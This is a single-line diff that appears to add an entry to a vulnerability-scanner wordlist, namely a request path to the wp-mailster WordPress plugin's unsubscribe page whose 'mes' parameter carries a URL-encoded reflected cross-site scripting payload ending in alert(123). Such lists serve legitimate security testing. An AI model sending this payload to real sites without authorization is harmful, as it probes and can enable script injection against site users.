@@ -1,0 +1,1 @@
+/wp-content/plugins/wp-mailster/view/subscription/unsubscribe2.php?mes=%3C%2Fscript%3E%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E
